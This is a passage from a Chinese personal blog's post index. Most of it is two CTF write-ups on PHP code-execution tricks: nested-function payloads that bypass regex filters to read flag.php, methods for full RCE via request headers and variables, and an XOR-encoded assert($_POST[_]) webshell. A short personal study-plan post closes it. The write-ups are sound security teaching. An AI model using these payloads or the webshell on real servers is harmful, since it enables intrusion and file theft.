<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?exp=print_r(array_reverse(scandir(current(localeconv()))));</span><br></pre></td></tr></table></figure>

<p><strong>2.array_rand(array_flip())</strong></p>
<p>array_flip()交换数组的键和值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?exp=print_r(array_flip(scandir(current(localeconv()))));</span><br></pre></td></tr></table></figure>

<p>array_rand()从数组中随机取出一个或多个单元，不断刷新访问就会不断随机返回，本题目中scandir()返回的数组只有5个元素，刷新几次就能刷出来flag.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?exp=print_r(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>

<p>3.session_id(session_start())</p>
<p>本题目虽然ban了hex关键字，导致hex2bin()被禁用，但是我们可以并不依赖于十六进制转ASCII的方式，因为flag.php这些字符是PHPSESSID本身就支持的。</p>
<p>使用session之前需要通过session_start()告诉PHP使用session，php默认是不主动使用session的。</p>
<p>session_id()可以获取到当前的session id。</p>
<p>因此我们手动设置名为PHPSESSID的cookie，并设置值为flag.php<br><a href="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215122804933-987719298.png"><img  
                     lazyload
                     alt="image"
                     data-src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215122804933-987719298.png"
                      alt="img"
                ></a></p>
<p><a href="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215122811714-1376880862.png"><img  
                     lazyload
                     alt="image"
                     data-src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215122811714-1376880862.png"
                      alt="img"
                ></a></p>
<p>那么我们最后一个问题：如何读flag.php的源码</p>
<p>因为et被ban了，所以不能使用file_get_contents()，但是可以可以使用readfile()或highlight_file()以及其别名函数show_source()</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">view-source:http://x.x.x.x:x/?exp=print_r(readfile(next(array_reverse(scandir(pos(localeconv()))))));</span><br><span class="line">?exp=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</span><br><span class="line">?exp=show_source(session_id(session_start()));</span><br></pre></td></tr></table></figure>

<h3 id="我们再来看一个题目："><a href="#我们再来看一个题目：" class="headerlink" title="我们再来看一个题目："></a>我们再来看一个题目：</h3><p><strong>ByteCTF Boringcode</strong><br>来看代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> $code = file_get_contents($url);</span><br><span class="line">            if (&#x27;;&#x27; === preg_replace(&#x27;/[a-z]+\((?R)?\)/&#x27;, NULL, $code)) &#123;</span><br><span class="line">                if (preg_match(&#x27;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#x27;, $code)) &#123;</span><br><span class="line">                    echo &#x27;bye~&#x27;;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    eval($code);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;error: host not allowed&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;error: invalid url&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们简单分析一下：<br>preg_match中<br>因为只允许使用纯字母函数，print_r这里被禁止掉了<br>注意这里的过滤比上面的多了很多，比如current就不能用了，我们可以用pos代替<br>看wp:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));</span><br></pre></td></tr></table></figure>

<p>我们一层一层的来分析：<br>首先题目给了提示，flag在上一级目录<br>所以我们要切换到上一级并读取 flag</p>
<p><strong>1：localeconv()函数</strong><br>前面已经提过：<br>localeconv() 函数：<br>返回一包含本地数字及货币格式信息的数组。而数组第一项就是.current() 返回数组中的当前单元, 默认取第一个值。</p>
<p>这里还有一个知识点：</p>
<p>current(localeconv())永远都是个点<br><a href="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215122827442-210069345.png"><img  
                     lazyload
                     alt="image"
                     data-src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215122827442-210069345.png"
                      alt="img"
                ></a></p>
<p><strong>2：pos()函数</strong><br>前面提过：</p>
<p>作用： 返回数组中的当前元素的值<br>因为正则条件中有nt，所以current()函数就无法使用，但是它有一个别名，就是pos()<br><strong>3： scandir()函数</strong><br><a href="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215122835861-618102055.png"><img  
                     lazyload
                     alt="image"
                     data-src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215122835861-618102055.png"
                      alt="img"
                ></a></p>
<p>前面 pos() 函数输出的值为点（.），所以这里变成scandir(.)，也就是当前目录</p>
<p>介绍下一个函数前我们先来了解一下php的数组指向函数，上一个题目简单提了一下<br><a href="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215122844620-1875817965.png"><img  
                     lazyload
                     alt="image"
                     data-src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215122844620-1875817965.png"
                      alt="img"
                ></a></p>
<p><a href="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215122851421-1984784318.png"><img  
                     lazyload
                     alt="image"
                     data-src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215122851421-1984784318.png"
                      alt="img"
                ></a></p>
<p><strong>4： next()函数</strong></p>
<p>作用： 将数组中的内部指针向前移动一位</p>
<p>在刚才 scandir() 函数返回的数组中，第一位是点（.），此时指针默认指向该位（也就是第一位），通过next()函数，将指针移动到下一位，也就是点点（..）</p>
<p><strong>5：chdir()函数</strong><br><a href="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215122859686-1136399217.png"><img  
                     lazyload
                     alt="image"
                     data-src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215122859686-1136399217.png"
                      alt="img"
                ></a></p>
<p>next() 函数返回点点（..），chdir()函数执行 chdir(..) 也就把目录切换到了上一级<br><strong>6：time()函数</strong><br><a href="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215122908020-1460845853.png"><img  
                     lazyload
                     alt="image"
                     data-src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215122908020-1460845853.png"
                      alt="img"
                ></a></p>
<p>chdir() 函数返回的是 bool 类型的 true ，所以对不需要传入参数的time()函数来说，本来就没有影响，可以正常执行<br><strong>7：localtime()函数</strong><br><a href="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215122916303-376857048.png"><img  
                     lazyload
                     alt="image"
                     data-src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215122916303-376857048.png"
                      alt="img"
                ></a></p>
<p>localtime()函数可以接受参数，并且第一个参数可以直接接受time()，所以直接利用<br><strong>8：pos()函数</strong></p>
<p>获取第一个参数，也就是系统当前的秒数<br><strong>9：chr()函数</strong><br><a href="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215122924673-2074351383.png"><img  
                     lazyload
                     alt="image"
                     data-src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215122924673-2074351383.png"
                      alt="img"
                ></a></p>
<p>chr()函数在这里什么作用呢？因为当秒数为46时，chr(46)&#x3D;”.”，用来获取点（.）（这里不能再用 localeconv() 函数是因为它不能传入参数）<br><strong>10：scandir()函数</strong></p>
<p>继续扫描当前目录（默认目录得上一级，因为我们刚才已经 chdir(“..”) 切换过）<br><strong>11：end()函数</strong></p>
<p>作用： 将 array 的内部指针移动到最后一个单元并返回其值<br>scandir() 返回当前目录的数组，end()函数将指针移动到最后一个（这里就是 flag.php ，因为文件名按字母先后排序，而字母 f 在本题中排最后<br><strong>12：readfile()函数</strong></p>
<p>作用： 读取文件并写入到输出缓冲<br>这里将执行readfile(“flag.php”)，将 flag.php 的内容读取出来<br><strong>13：echo()函数</strong></p>
<p>用echo()函数将 flag 输出</p>
<p>本地测试了一下确实能打通<br><a href="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215180456291-543648465.png"><img  
                     lazyload
                     alt="image"
                     data-src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215180456291-543648465.png"
                      alt="img"
                ></a></p>
<p><a href="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215180505959-1615152192.png"><img  
                     lazyload
                     alt="image"
                     data-src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215180505959-1615152192.png"
                      alt="img"
                ></a></p>
<p><strong>再来看一道题目：</strong></p>
<h3 id="2019上海市大学生网络安全大赛-decade"><a href="#2019上海市大学生网络安全大赛-decade" class="headerlink" title="2019上海市大学生网络安全大赛_decade"></a>2019上海市大学生网络安全大赛_decade</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$code = $_GET[&#x27;code&#x27;];</span><br><span class="line">if (!empty($code)) &#123;</span><br><span class="line">        if (&#x27;;&#x27; === preg_replace(&#x27;/[a-z]+\((?R)?\)/&#x27;, NULL, $code)) &#123;</span><br><span class="line">            if (preg_match(&#x27;/readfile|if|time|local|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#x27;, $code)) &#123;</span><br><span class="line">                    echo &#x27;bye~&#x27;;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    eval($code);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            echo &quot;No way!!!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">        echo &quot;No way!!!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>审计源码，过滤的比上一个更多：<br>我们来对比一下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));</span><br></pre></td></tr></table></figure>

<p>先列一下不能用的函数，看看能不能代替：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">localeconv()</span><br><span class="line">time()</span><br><span class="line">localtime()</span><br><span class="line">readfile()</span><br></pre></td></tr></table></figure>

<p>我们从payload开始分析吧：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">readgzfile(end(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion()))))))))))))));</span><br></pre></td></tr></table></figure>

<p>这里只分析一下我们这个题目和上一个不同，详细的盯着手册在本地测试就行了<br>仔细想想，我们只有两个问题：<br>1：怎么构造点(.)<br>2:readfile被过滤怎么读取</p>
<p>解决第一个：<br><a href="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215180519215-1970538942.png"><img  
                     lazyload
                     alt="image"
                     data-src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215180519215-1970538942.png"
                      alt="img"
                ></a></p>
<p>46经过chr()转换就是.</p>
<p>第二个：<br>readgzfile可以代替readfile<br><a href="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215180527480-467818924.png"><img  
                     lazyload
                     alt="image"
                     data-src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215180527480-467818924.png"
                      alt="img"
                ></a></p>
<p>好了问题解决，剩下的就是照着上一个思路搬砖了。</p>
<p>*<strong>0*</strong>|***1***<strong>0x02 总结</strong></p>
<p>先来总结一下这种题目的思路：<br>首先我们先看一下过滤了哪些函数，还有哪些关键字。很多时候会过滤读文件的，我们可以先fuzz一下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php var_dump(get_defined_functions());?&gt;</span><br></pre></td></tr></table></figure>

<p>之后呢就是想方设法“套娃”来RCE，或者进行目录遍历了。<br>列一下常用函数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getchwd() 函数返回当前工作目录。</span><br><span class="line">scandir() 函数返回指定目录中的文件和目录的数组。</span><br><span class="line">dirname() 函数返回路径中的目录部分。</span><br><span class="line">chdir() 函数改变当前的目录。</span><br><span class="line"></span><br><span class="line">readfile()  输出一个文件</span><br><span class="line"></span><br><span class="line">current()       返回数组中的当前单元, 默认取第一个值</span><br><span class="line">pos()           current() 的别名</span><br><span class="line">next() 函数将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line">end()       将内部指针指向数组中的最后一个元素，并输出。</span><br><span class="line">array_rand()    函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。</span><br><span class="line">array_flip()    array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。</span><br><span class="line">array_slice() 函数在数组中根据条件取出一段值，并返回</span><br><span class="line">chr() 函数从指定的 ASCII 值返回字符。</span><br><span class="line">hex2bin — 转换十六进制字符串为二进制字符串</span><br><span class="line"></span><br><span class="line">getenv()        获取一个环境变量的值(在7.1之后可以不给予参数)</span><br></pre></td></tr></table></figure>

<p>前面呢因为正则过滤还有好几种方法没提，这里来讲一下：<br>上面的目录遍历形式的没有环境区别，我们这里来分一下环境：</p>
<h4 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h4><p>getallheaders()函数<br><a href="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215180538368-1134993250.png"><img  
                     lazyload
                     alt="image"
                     data-src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215180538368-1134993250.png"
                      alt="img"
                ></a></p>
<p><a href="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215180547719-1521326091.png"><img  
                     lazyload
                     alt="image"
                     data-src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215180547719-1521326091.png"
                      alt="img"
                ></a></p>
<p>先通过头部传入恶意数据，之后我们再取出来：<br><a href="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215180556214-286681138.png"><img  
                     lazyload
                     alt="image"
                     data-src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215180556214-286681138.png"
                      alt="img"
                ></a></p>
<p>成功RCE</p>
<h4 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h4><p>get_defined_vars()函数<br><a href="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215180603439-1208560909.png"><img  
                     lazyload
                     alt="image"
                     data-src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215180603439-1208560909.png"
                      alt="img"
                ></a></p>
<p>我们可以通过定义新的变量来控制该函数的返回值<br>然后变成我们想要执行的代码，例如phpinfo();<br><a href="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215180610092-1006957565.png"><img  
                     lazyload
                     alt="image"
                     data-src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215180610092-1006957565.png"
                      alt="img"
                ></a></p>
<p>然后我们现在要想办法将我们想执行的代码从数组中提取出来<br><a href="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215180616545-582547896.png"><img  
                     lazyload
                     alt="image"
                     data-src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215180616545-582547896.png"
                      alt="img"
                ></a></p>
<p>先用current函数取出get键值所对应的值，然后再利用array_values函数将数组的值重新组成一个数组，再次利用current函数取出数组第一个值，将var_dump改成eval即可实现RCE<br><a href="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215180625929-1191150283.png"><img  
                     lazyload
                     alt="image"
                     data-src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215180625929-1191150283.png"
                      alt="img"
                ></a></p>
<h4 id="除了这两个，我们也可以通过session-id-session-start-，上面也已经提过"><a href="#除了这两个，我们也可以通过session-id-session-start-，上面也已经提过" class="headerlink" title="除了这两个，我们也可以通过session_id(session_start())，上面也已经提过"></a>除了这两个，我们也可以通过session_id(session_start())，上面也已经提过</h4><p>题目虽然ban了hex关键字，导致hex2bin()被禁用，但是我们可以并不依赖于十六进制转ASCII的方式，因为flag.php这些字符是PHPSESSID本身就支持的。使用session之前需要通过session_start()告诉PHP使用session，php默认是不主动使用session的。session_id()可以获取到当前的session id。因此我们手动设置名为PHPSESSID的cookie，并设置值为flag.php<br><a href="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215180634547-1893645688.png"><img  
                     lazyload
                     alt="image"
                     data-src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215180634547-1893645688.png"
                      alt="img"
                ></a></p>
<p><a href="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215180643916-1652214157.png"><img  
                     lazyload
                     alt="image"
                     data-src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215180643916-1652214157.png"
                      alt="img"
                ></a></p>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
  </entry>
  <entry>
    <title>无数字无字母RCE</title>
    <url>/2020/04/11/%E5%9B%9B%E6%9C%88/%E6%97%A0%E6%95%B0%E5%AD%97%E6%97%A0%E5%AD%97%E6%AF%8DRCE/</url>
    <content><![CDATA[<h2 id="无数字无字母RCE"><a href="#无数字无字母RCE" class="headerlink" title="无数字无字母RCE"></a>无数字无字母RCE</h2><p>这一篇我写的特别丑陋，推荐别点开。</p>
<p><a class="link"   href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" >https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html<i class="fas fa-external-link-alt"></i></a></p>
<p>常见的该类型代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	if(!preg_match(&#x27;/[a-zA-Z0-9]/is&#x27;,$_GET[&#x27;shell&#x27;]))&#123;</span><br><span class="line">	eval($_GET[&#x27;shell&#x27;]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>核心思路，将非字母非数字的字符进行各种变换，最好构造出a-z任意一个字符。利用PHP允许动态函数执行的特点，拼接一个函数名，然后动态执行。</p>
<span id="more"></span>

<p>P神说了可以有三种方法实现</p>
<p>1、异或</p>
<p>PHP的字符串，两个字符串异或的结果是一个新的字符串。【我不明白其中原理</p>
<p>写写脚本吧</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://pic4.zhimg.com/80/v2-e70ed860b81b4c5e5ec89b8f0edf805d_1440w.jpg"
                     
                ></p>
<p>也可以像P神一样查出每个字母 拼接就好</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%01&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%12&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%14&#x27;</span>^<span class="string">&#x27;`&#x27;</span>); <span class="comment">// $_=&#x27;assert&#x27;;</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%2F&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;]&#x27;</span>); <span class="comment">// $__=&#x27;_POST&#x27;;</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$$__</span>;</span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]); <span class="comment">// assert($_POST[_]);</span></span><br></pre></td></tr></table></figure>

<p>方法三、</p>
<p>那么，如果不用位运算这个套路，能不能搞定这题呢？有何不可。</p>
<p>这就得借助PHP的一个小技巧，先看文档： <a class="link"   href="http://php.net/manual/zh/language.operators.increment.php" >http://php.net/manual/zh/language.operators.increment.php<i class="fas fa-external-link-alt"></i></a></p>
<p><a href="https://www.leavesongs.com/media/attachment/2017/02/17/a386505b-1c14-48f0-88cb-66923770df33.jpg"><img  
                     lazyload
                     alt="image"
                     data-src="https://www.leavesongs.com/media/attachment/2017/02/17/a386505b-1c14-48f0-88cb-66923770df33.8732f996cd67.jpg"
                      alt="14872693882387.jpg"
                ></a></p>
<p>也就是说，<code>&#39;a&#39;++ =&gt; &#39;b&#39;</code>，<code>&#39;b&#39;++ =&gt; &#39;c&#39;</code>… 所以，我们只要能拿到一个变量，其值为<code>a</code>，通过自增操作即可获得a-z中所有字符。</p>
<p>那么，如何拿到一个值为字符串’a’的变量呢？</p>
<p>巧了，数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。</p>
<p>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为<code>Array</code>：</p>
<p><a href="https://www.leavesongs.com/media/attachment/2017/02/17/4d0c6bc9-5417-41b2-91ca-4e110e8d1350.jpg"><img  
                     lazyload
                     alt="image"
                     data-src="https://www.leavesongs.com/media/attachment/2017/02/17/4d0c6bc9-5417-41b2-91ca-4e110e8d1350.72f524026162.jpg"
                      alt="14872697183159.jpg"
                ></a></p>
<p>再取这个字符串的第一个字母，就可以获得’A’了。</p>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
  </entry>
  <entry>
    <title>迄今为止</title>
    <url>/2020/04/11/%E5%9B%9B%E6%9C%88/%E8%BF%84%E4%BB%8A%E4%B8%BA%E6%AD%A2/</url>
    <content><![CDATA[<p>说实话，好久没有写过这些东西了。</p>
<p>在南京的时候，心里总是想着，要牛逼。技术要厉害。</p>
<p>要会开发网站，要会安全，要会数模，要会机器学习。</p>
<p>什么都想会，什么都想学。但是又懒的很。</p>
<p>很悲催吧。更悲催的是，和朋友们讨论的时候，我居然还有一种优越感</p>
<p>觉得自己比他们强，比他们牛逼。</p>
<span id="more"></span>

<p>然而并不是这样的。无所谓人，无所谓物，是自己在自己的世界待的太久了。</p>
<p>年轻气盛，不知天高地厚。妄想着什么都会。妄想着牛逼哄哄。</p>
<p>沉下心来了吗？ 并没有。</p>
<p>每一次在学校的时候，总是想着怎么这么难？怎么我还不会？</p>
<p>怎么他们什么都会？怎么我这么垃圾？【笑</p>
<p>其实还是偷懒吧。时间会证明很多东西。更何况是技术上的东西。</p>
<p>沉下心情，坚持努力，不忘初心，先把小BBS开发做成功吧。</p>
<p>下面写下这个月的安排</p>
<p>CTF 每天一题！【仅仅一题   还有笔记 大概两个小时  早上7点10分</p>
<p>开发训练  【早上8点&#x2F;下午3点30   4个小时</p>
<p>机器学习  【晚上 9点30 -11点30  尤其重点</p>
]]></content>
      <categories>
        <category>杂项</category>
      </categories>
  </entry>
</search>
